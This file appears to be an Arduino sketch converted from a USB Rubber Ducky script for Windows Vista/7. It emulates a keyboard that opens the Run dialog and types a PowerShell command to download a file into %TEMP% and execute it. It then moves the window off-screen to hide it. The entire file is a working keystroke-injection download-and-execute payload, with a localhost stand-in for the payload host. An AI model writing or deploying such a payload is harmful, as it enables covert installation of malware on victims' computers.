
/* Converted by LeonarDucky v1.0 */

#include <Keyboard.h>
void setup() {
Keyboard.begin();
delay(3000);
// Target: WINDOWS VISTA/7
// Encoder V2.4
// Using the run command for a broader OS base.
delay(3000);
delay(500);
Keyboard.press(KEY_LEFT_GUI);
Keyboard.press('r');
Keyboard.releaseAll();
delay(1000);
Keyboard.print("powershell (new-object System.Net.WebClient).DownloadFile('http://localhost/1.old','%TEMP%\\1.exe'); Start-Process \"%TEMP%\\1.exe\"");
delay(500);
delay(500);
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll(); 
delay(750);
delay(500);
Keyboard.press(KEY_LEFT_ALT);
Keyboard.press(32);
Keyboard.releaseAll();
Keyboard.print("M");
for(int i = 0; i < 100; i++){
delay(500);
Keyboard.press(KEY_DOWN_ARROW);
Keyboard.releaseAll(); 
}
delay(500);
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll(); 
}
void loop() {}